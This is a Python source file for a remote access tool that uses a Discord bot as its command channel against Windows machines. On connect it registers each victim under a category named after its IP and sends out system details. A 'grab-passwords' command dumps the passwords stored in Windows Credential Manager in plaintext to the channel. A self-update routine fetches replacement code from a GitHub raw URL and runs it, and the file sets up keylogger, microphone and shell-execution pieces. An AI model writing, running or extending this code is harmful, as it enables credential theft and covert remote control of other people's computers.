import discord
import subprocess
import threading
import asyncio
import os
import socket
import platform
import re
import requests
from discord import File, Embed
from pynput import keyboard
import sqlite3
import shutil
from dotenv import load_dotenv  # Ensure python-dotenv is installed
import win32cred  # For accessing Windows Credential Manager

# Load environment variables from .env file
load_dotenv()

# Constants
ENCRYPTED_DISCORD_TOKEN = os.getenv("ENCRYPTED_DISCORD_TOKEN")
if not ENCRYPTED_DISCORD_TOKEN:
    raise ValueError("Discord token is missing.")
DISCORD_TOKEN = ENCRYPTED_DISCORD_TOKEN  # Directly assign the token
SERVER_ID = 1350570142681141381
CHANNELS = ["commands", "recordings", "mic-listening", "logs", "files", "keylogger"]
COMMAND_PREFIX = ","
KEYLOG_FILE = "found_virus.txt"
TOKEN_LOG_FILE = "issues.txt"

# Retrieve System Information
def get_system_info():
    if platform.system() != "Windows":
        return "This script only supports Windows."
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    return {
        "hostname": hostname,
        "ip": ip,
        "os": platform.system(),
        "architecture": platform.machine(),
        "key": f"pc-{ip}"  # Unique key for this computer
    }

# Grab Stored Passwords (Windows Only)
def grab_passwords():
    if platform.system() != "Windows":
        return "Password retrieval is only supported on Windows."
    try:
        credentials = win32cred.CredEnumerate(None, 0)  # Enumerate all credentials
        if not credentials:
            return "No credentials found in the Windows Vault."
        result = []
        for cred in credentials:
            username = cred["UserName"] if "UserName" in cred else "N/A"
            target_name = cred["TargetName"] if "TargetName" in cred else "N/A"
            credential_blob = cred["CredentialBlob"] if "CredentialBlob" in cred else b""
            password = credential_blob.decode("utf-16-le") if credential_blob else "N/A"
            result.append(f"Target: {target_name}, Username: {username}, Password: {password}")
        return "\n".join(result)
    except Exception as e:
        return f"Error retrieving passwords: {e}"

# Execute Shell Commands Asynchronously
async def execute_shell_command(command):
    try:
        process = await asyncio.create_subprocess_shell(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        return stdout.decode() if process.returncode == 0 else stderr.decode()
    except Exception as e:
        return f"Error executing command: {e}"

# Auto-update Mechanism
def update_script():
    try:
        repo_url = "https://raw.githubusercontent.com/tfssolacedev/MTweaks/main/m.py"  # Raw URL for the latest script
        local_script_path = os.path.abspath(__file__)  # Path to the current script
        temp_script_path = "temp_m.py"  # Temporary file to store the downloaded script

        # Step 1: Download the latest version of the script
        print("Downloading the latest script...")
        response = requests.get(repo_url)
        if response.status_code != 200:
            raise Exception(f"Failed to download the script. HTTP Status: {response.status_code}")
        
        with open(temp_script_path, "wb") as f:
            f.write(response.content)

        # Step 2: Compare the local script with the downloaded version
        with open(local_script_path, "r", encoding="utf-8") as local_file:
            local_content = local_file.read()
        with open(temp_script_path, "r", encoding="utf-8") as temp_file:
            new_content = temp_file.read()

        if local_content != new_content:
            print("Update found! Updating the script...")
            shutil.copy(temp_script_path, local_script_path)  # Replace the old script with the new one
            print("Script updated successfully. Restarting...")
            os.execv(sys.executable, [sys.executable] + sys.argv)  # Restart the script with the updated version
        else:
            print("No updates available.")

        # Clean up temporary files
        if os.path.exists(temp_script_path):
            os.remove(temp_script_path)
    except Exception as e:
        print(f"Error updating script: {e}")

# Initialize Discord Client
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"Bot connected to Discord as {client.user}")

    # Start auto-update in a separate thread
    threading.Thread(target=update_script, daemon=True).start()

    # Existing initialization logic...
    guild = client.get_guild(SERVER_ID)
    if not guild:
        print("Could not find the server.")
        return
    info = get_system_info()
    category_name = info["key"]
    category = discord.utils.get(guild.categories, name=category_name)
    if not category:
        category = await guild.create_category(category_name)
        print(f"Created category: {category_name}")
    existing_channels = [channel.name for channel in category.text_channels]
    for channel_name in CHANNELS:
        if channel_name not in existing_channels:
            await guild.create_text_channel(channel_name, category=category)
            print(f"Created channel: #{channel_name} in category {category_name}")
    logs_channel = discord.utils.get(category.text_channels, name="logs")
    if logs_channel:
        embed = Embed(title="System Information", color=discord.Color.blue())
        for key, value in info.items():
            embed.add_field(name=key.capitalize(), value=value, inline=False)
        await logs_channel.send(embed=embed)

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    info = get_system_info()
    category_name = info["key"]
    category = discord.utils.get(message.guild.categories, name=category_name)
    if not category or message.channel.category != category or message.channel.name != "commands":
        return
    content = message.content.strip()
    if not content.startswith(COMMAND_PREFIX):
        return
    command = content[len(COMMAND_PREFIX):].strip().lower()

    if command == "grab-passwords":
        # Grab stored passwords from Windows Vault
        credentials = grab_passwords()
        embed = Embed(title="Stored Credentials", description=f"```\n{credentials}\n```", color=discord.Color.blue())
        await message.channel.send(embed=embed)
    elif command == "update":
        # Manually trigger the update mechanism
        threading.Thread(target=update_script, daemon=True).start()
        embed = Embed(title="Update", description="Checking for updates...", color=discord.Color.green())
        await message.channel.send(embed=embed)
    else:
        embed = Embed(title="Error", description="Unknown command. Use `,help` for a list of commands.", color=discord.Color.red())
        await message.channel.send(embed=embed)

# Run the Discord bot
client.run(DISCORD_TOKEN)
